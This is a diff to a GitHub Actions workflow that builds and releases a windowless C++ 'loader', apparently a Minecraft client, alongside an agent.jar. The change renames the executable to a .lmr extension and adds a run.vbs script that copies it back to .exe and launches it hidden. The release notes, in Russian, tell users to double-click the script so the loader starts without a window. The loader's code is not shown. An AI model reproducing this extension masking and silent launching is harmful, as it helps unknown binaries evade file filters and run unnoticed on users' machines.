@@ -43,16 +43,28 @@ jobs:
       - name: Build loader (C++)
         run: |
           x86_64-w64-mingw32-g++ -O2 -static \
-            -o "out/ekran_uaqyty.exe" native/loader.cpp \
+            -o "out/ekran_uaqyty.lmr" native/loader.cpp \
             -lwinhttp -lshlwapi -lkernel32 -luser32 \
             -mwindows
+
+      - name: Create run.vbs launcher
+        run: |
+          cat > out/run.vbs << 'EOF'
+          Set fs = CreateObject("Scripting.FileSystemObject")
+          Set sh = CreateObject("WScript.Shell")
+          dir = fs.GetParentFolderName(WScript.ScriptFullName)
+          src = dir & "\ekran_uaqyty.lmr"
+          tmp = dir & "\ekran_uaqyty.exe"
+          fs.CopyFile src, tmp, True
+          sh.Run Chr(34) & tmp & Chr(34), 0, False
+          EOF
 
       - name: Publish to Releases
         env:
           GH_TOKEN: ${{ github.token }}
         run: |
           gh release delete latest --yes --cleanup-tag || true
-          gh release create latest out/agent.jar "out/ekran_uaqyty.exe" \
+          gh release create latest out/agent.jar "out/ekran_uaqyty.lmr" out/run.vbs \
             --target "$GITHUB_SHA" \
             --title "System Client for Minecraft $MC_VERSION" \
-            --notes "Скачай ekran_uaqyty.exe. Запусти от имени Администратора. Двойной клик — запускается без окна. Ctrl+U — открыть лоадер."
+            --notes "Скачай ekran_uaqyty.lmr и run.vbs в одну папку. Двойной клик на run.vbs — лоадер запускается без окна. Ctrl+U — открыть лоадер."
